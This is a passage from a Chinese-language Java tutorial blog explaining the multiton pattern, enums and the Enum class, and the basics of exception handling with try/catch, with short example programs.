<strong>特点总结：构造方法私有化，类内部提供static方法获取实例化对象，这样不管外部如何操作永远都只有一个实例化对象提供。</strong></p><h5 id="多例设计"><a href="#多例设计" class="headerlink" title="多例设计"></a>多例设计</h5><p>​    与单例设计模式对应，单例设计模式指的是只保留有一个实例化对象，而多例设计指的是可以保留有多个实例化对象，例如L如果现在要定义一个描述性别的类，那么该对象只有两个：男、女。或者描述颜色基色的类：红蓝绿。这种就可以用多例设计。</p><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//多例设计模式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义颜色描述的类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Color</span> <span class="variable">RED</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Color</span>(<span class="string">&quot;红色&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Color</span> <span class="variable">GREEN</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Color</span>(<span class="string">&quot;绿色&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Color</span> <span class="variable">BLUE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Color</span>(<span class="string">&quot;蓝色&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Color</span><span class="params">(String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Color <span class="title function_">getInstance</span><span class="params">(String color)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (color) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;red&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> RED;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;green&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> GREEN;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;blue&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> BLUE;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.title;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test40</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Color</span> <span class="variable">c</span> <span class="operator">=</span> Color.getInstance(<span class="string">&quot;green&quot;</span>);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h4><p>​    很多语言都有枚举的概念，但是Java在JDK1.5之后才有枚举的概念。实际的开发中枚举的主要作用是用于定义有限个数对象的一种结构(多例设计)。枚举就属于多例设计，并且其结构比多例设计更加简单。</p><h5 id="定义枚举类"><a href="#定义枚举类" class="headerlink" title="定义枚举类"></a>定义枚举类</h5><p>​    JDK1.5之后有一个enum的关键字。</p><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//枚举</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//枚举类</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color1</span>&#123;</span><br><span class="line">    RED,GREEN,BLUE;<span class="comment">//实例化对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test41</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Color1</span> <span class="variable">c</span> <span class="operator">=</span> Color1.RED;<span class="comment">//获取实例化对象</span></span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此时如果采用了多例设计模式来进行设计，那么需要编写很多的程序代码，这样对于开发的复杂度比较高，毕竟牵扯到构造方法的私有化和静态方法。多例设计模式和枚举设计虽然可以实现相同的功能，但是使用枚举可以在程序编译时判断使用的实例化对象是否存在。</p><p>​    在进行枚举处理的时候还可以利用valuse()方法获取所有的枚举对象进行输出。</p><p>范例：获取所有的枚举对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package two;</span><br><span class="line"></span><br><span class="line">//枚举</span><br><span class="line"></span><br><span class="line">//枚举类</span><br><span class="line">enum Color1&#123;</span><br><span class="line">    RED,GREEN,BLUE;//实例化对象</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Test41 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        for (Color1 c :Color1.values())&#123;</span><br><span class="line">            System.out.println(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    上面的代码如果要在多例设计模式的话，就要对象数组了。</p><p>​    从JDK1.5追加了枚举结构之后，就可以在switch之中进行枚举项的判断。</p><p>范例：观察枚举与switch</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package two;</span><br><span class="line"></span><br><span class="line">//枚举</span><br><span class="line"></span><br><span class="line">//枚举类</span><br><span class="line">enum Color1 &#123;</span><br><span class="line">    RED, GREEN, BLUE;//实例化对象</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Test41 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Color1 c = Color1.RED;</span><br><span class="line">        switch (c) &#123;</span><br><span class="line">            case RED:</span><br><span class="line">                System.out.println(&quot;红色&quot;);</span><br><span class="line">                break;</span><br><span class="line">            case BLUE:</span><br><span class="line">                System.out.println(&quot;蓝色&quot;);</span><br><span class="line">                break;</span><br><span class="line">            case GREEN:</span><br><span class="line">                System.out.println(&quot;绿色&quot;);</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    多例上是无法实现这种与switch直接相连接的，多例想要实现它就需要编写大量的if语句。</p><h5 id="Enum类"><a href="#Enum类" class="headerlink" title="Enum类"></a>Enum类</h5><p>​    严格意义上来讲枚举并不属于一种新的结构，它的本质相当于是一个类，但是这个类默认会继承Enum类，首先观察一下Enum类的基本定义。</p><p>类的基本定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> Enum&lt;E <span class="keyword">extends</span> <span class="title class_">Enum</span>&lt;E&gt;&gt;</span><br><span class="line"><span class="keyword">extends</span> <span class="title class_">Object</span></span><br><span class="line"><span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;E&gt;,Serializable</span><br></pre></td></tr></table></figure><p>​    现在定义的枚举类的类型就是Enum中所使用的E类型。下面观察下Enum类中的方法：</p><table><thead><tr><th>No.</th><th>方法名称</th><th>类型</th><th></th></tr></thead><tbody><tr><td>01</td><td>Protected Enum(String name,int ordinal)</td><td>构造</td><td>传入名字和序号</td></tr><tr><td>02</td><td>public final String name()</td><td>普通</td><td>获得对象名字</td></tr><tr><td>03</td><td>Public final int ordinal()</td><td>普通</td><td>获得对象序号</td></tr></tbody></table><p>范例：观察Enum类的存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//观察Enum类存在</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color2</span>&#123;</span><br><span class="line">    RED,GREEN,BLUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test42</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Color2 c:Color2.values())&#123;</span><br><span class="line">            System.out.println(c.ordinal()+<span class="string">&quot; - &quot;</span> + c.name());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073607.jpg"                      alt="image-20220712162840811"                ></p><p>​    在枚举之中每一个对象的序号都是根据枚举对象的定义顺序来决定的。</p><p>​    下面就有一个问题：请解释enum与Enum的区别</p><p>​    –enum：是从JDK1.5之后提供的一个关键字，用于定义枚举类；</p><p>​    –Enum：是一个抽象类，所以使用enum关键字定义的类就默认继承了此类。</p><h5 id="定义枚举结构"><a href="#定义枚举结构" class="headerlink" title="定义枚举结构"></a>定义枚举结构</h5><p>​    一直在强调枚举本身属于一种多例设计模式，那么既然是多例设计模式，那么在一个类之中可以定义的结构是非常多的。例如：构造方法、普通方法、属性等，那么这些内容在枚举类中依然可以直接定义，<strong>但是需要定义的是：枚举类中定义的构造方法不能够采用非私有化定义（public无法使用）</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义枚举结构</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color2</span>&#123;</span><br><span class="line">    RED(<span class="string">&quot;红色&quot;</span>),GREEN(<span class="string">&quot;绿色&quot;</span>),BLUE(<span class="string">&quot;蓝色&quot;</span>);<span class="comment">//实例化对象,必须在第一行</span></span><br><span class="line">    <span class="keyword">private</span> String title;<span class="comment">//定义属性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Color2</span><span class="params">(String title)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.title;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test42</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Color2 c:Color2.values())&#123;</span><br><span class="line">            System.out.println(c.ordinal()+<span class="string">&quot; - &quot;</span> + c.name()+<span class="string">&quot; - &quot;</span>+c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73609.jpg"                      alt="image-20220712172423996"                ></p><p>​    本程序在简化程度上一定要远远高于多例设计模式。除了这种基本的结构之外，在枚举类中也可以实现接口的继承。</p><p>范例：让枚举实现接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//枚举实现接口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color3</span> <span class="keyword">implements</span> <span class="title class_">IMessage4</span> &#123;</span><br><span class="line">    RED(<span class="string">&quot;红色&quot;</span>), GREEN(<span class="string">&quot;绿色&quot;</span>), BLUE(<span class="string">&quot;蓝色&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Color3</span><span class="params">(String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.title;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test43</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage4</span> <span class="variable">msg</span> <span class="operator">=</span> Color3.RED;</span><br><span class="line">        System.out.println(msg.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>在枚举类里最有意思的事它可以直接定义抽象方法，并且要求每一个枚举对象都要独立实现覆写此抽象方法。</strong></p><p>​    枚举的定义是非常灵活的，但是在实际的使用之中，枚举更多情况下还是建议他的正确用法，就是定义一个实例对象即可。</p><h5 id="枚举的实际应用"><a href="#枚举的实际应用" class="headerlink" title="枚举的实际应用"></a>枚举的实际应用</h5><p>​    现在定义一个person类，里面一定有性别，性别肯定不希望用户随意输入，所以使用枚举最合适。</p><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Sex</span> &#123;</span><br><span class="line">    MALE(<span class="string">&quot;男&quot;</span>), FEMALE(<span class="string">&quot;女&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Sex</span><span class="params">(String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.title;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person11</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person11</span><span class="params">(String name, <span class="type">int</span> age, Sex sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;姓名:&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;年龄：&quot;</span>+<span class="built_in">this</span>.age+<span class="string">&quot;性别：&quot;</span>+<span class="built_in">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test44</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">Person11</span>(<span class="string">&quot;张三&quot;</span>,<span class="number">20</span>,Sex.MALE));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    可以发现这个例子枚举可以正常实现，追加几个判断即可，所以对于枚举，愿意用就用，不愿意就不用。</p><hr><h4 id="异常的捕获及处理"><a href="#异常的捕获及处理" class="headerlink" title="异常的捕获及处理"></a>异常的捕获及处理</h4><h5 id="认识异常对程序的影响"><a href="#认识异常对程序的影响" class="headerlink" title="认识异常对程序的影响"></a>认识异常对程序的影响</h5><p>​    异常指的是导致程序中断执行的一种指令流。那么下面首先来观察没有异常产生的程序结果。</p><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test45</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【1】*****程序开始执行*****&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;【2】*****数学计算********&quot;</span> + (<span class="number">10</span> / <span class="number">2</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;【3】*****程序执行完毕*****&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在程序正常的执行过程中，程序会按照从头到尾的顺序执行。</p><p>范例：异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异常</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test45</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【1】*****程序开始执行*****&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;【2】*****数学计算********&quot;</span> + (<span class="number">10</span> / <span class="number">0</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;【3】*****程序执行完毕*****&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073610.jpg"                      alt="image-20220714203101710"                ></p><p>​    出现错误后，整个程序不会按照既定的方式进行，而是中断了执行。为了保证程序出现非致命错误后程序可以正确完成，我们就需要一个异常机制，保证程序的继续进行。</p><hr><h5 id="处理异常"><a href="#处理异常" class="headerlink" title="处理异常"></a>处理异常</h5><p>​    在Java中我们可以用以下几个关键字来进行异常的处理，可以使用：try、catch、finally这几个关键字来完成，其基本的处理结构如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">//可能出现异常的语句</span></span><br><span class="line">&#125;[<span class="keyword">catch</span>(异常类型 异常对象)&#123;</span><br><span class="line"><span class="comment">//异常处理</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型 异常对象)&#123;</span><br><span class="line"><span class="comment">//异常处理</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型 异常对象)&#123;</span><br><span class="line"><span class="comment">//异常处理</span></span><br><span class="line">&#125; ...][<span class="keyword">finally</span> &#123;</span><br><span class="line">不管异常是否处理都要转型</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure><p>​    在此格式之中可以使用的组合为：try..catch、try…catch..finally、try…finally。</p><p>范例：处理异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异常处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test45</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【1】*****程序开始执行*****&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;【2】*****数学计算********&quot;</span> + (<span class="number">10</span> / <span class="number">0</span>));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ArithmeticException e)&#123;</span><br><span class="line">            System.out.println(e);<span class="comment">//处理异常</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;【3】*****程序执行完毕*****&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73612.jpg"                      alt="image-20220715150334728"                ></p><p>​    可以发现即使处理了异常，程序也可以正常执行完毕，所以此时的设计属于一个合理设计，但是有一个问题出现了。此时在异常处理的时候直接输出的是一个异常类的对象，那么此时此对象如果直接打印（调用toString（））所得到的异常信息并不完整，那么如果想要得到一个完整的异常信息，则可以使用异常类中提供的printStackTrace()方法完成。</p><p>范例：获取完整异常信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异常处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test45</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【1】*****程序开始执行*****&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;【2】*****数学计算********&quot;</span> + (<span class="number">10</span> / <span class="number">0</span>));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ArithmeticException e)&#123;</span><br><span class="line">            e.printStackTrace();<span class="comment">//处理异常</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;【3】*****程序执行完毕*****&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073614.jpg"                      alt="image-20220715150834249"                ></p><p>​    